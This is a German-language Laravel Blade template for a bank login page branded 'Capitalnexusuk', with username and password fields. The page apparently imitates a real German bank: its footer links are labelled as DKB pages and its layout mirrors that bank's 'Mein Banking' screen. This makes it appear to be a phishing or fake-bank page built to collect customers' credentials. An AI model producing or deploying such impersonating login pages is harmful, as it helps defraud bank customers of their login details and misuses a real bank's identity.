<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>capitalnexusuk - Mein Banking</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            height: 100%;
            background-color: #f5f5f5;
        }
        .container {
            display: flex;
            flex-direction: column;
            min-height: 100%;
        }
        header {
            background-color: white;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .logo {
            color: #0073cf;
            font-weight: bold;
            font-size: 24px;
        }
        .top-right {
            position: absolute;
            top: 20px;
            right: 20px;
        }
        .top-right a {
            color: #0073cf;
            text-decoration: none;
            font-size: 14px;
        }
        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 300px;
        }
        h1 {
            margin: 0 0 20px;
            font-size: 24px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: none;
            border-bottom: 1px solid #ccc;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0073cf;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .forgot-link {
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }
        .forgot-link a {
            color: #0073cf;
            text-decoration: none;
        }
        footer {
            background-color: #333;
            color: white;
            padding: 10px;
            font-size: 12px;
        }
        footer a {
            color: white;
            text-decoration: none;
            margin-right: 15px;
        }
    </style>
</head>
<body>
    @stack('script')
    @include('partials.plugins')
    @include('partials.notify')
    @include('partials.user_activity')
    
    <div class="container">
      
        <header>
            <div class="logo">Capitalnexusuk</div>
            <div class="top-right">
                <a href="{{ route('user.register') }}">Zum bisherigen Banking</a>
            </div>
        </header>
        <main>
            <div class="login-box">
                <h1>Mein Banking</h1>
                <form action="{{ route('user.login') }}" method="POST">
                    @csrf
                    <input type="text"  name="username" placeholder="Anmeldename" required>
                    <input type="password" name="password" placeholder="Passwort" required>
              
                    <button type="submit">Anmelden</button>
                </form>
                <div class="forgot-link">
                    <a href="{{ route('user.password.request') }}">Passwort</a> oder <a href="{{ route('user.password.request') }}">Anmeldenamen</a> vergessen?
                </div>
            </div>
        </main>
        <footer>
            <a href="#">DKB Startseite</a>
            <a href="#">Infoseite</a>
            <a href="#">DKB Verwalteplattform</a>
            <a href="#">DKB Treuhänderplattform</a>
            <a href="#">Impressum</a>
            <a href="#">Datenschutz</a>
            <a href="#">Cookie-Einstellungen</a>
            <a href="#">Preise & Bedingungen</a>
            <a href="#">Hilfe</a>
        </footer>
    </div>
</body>
</html>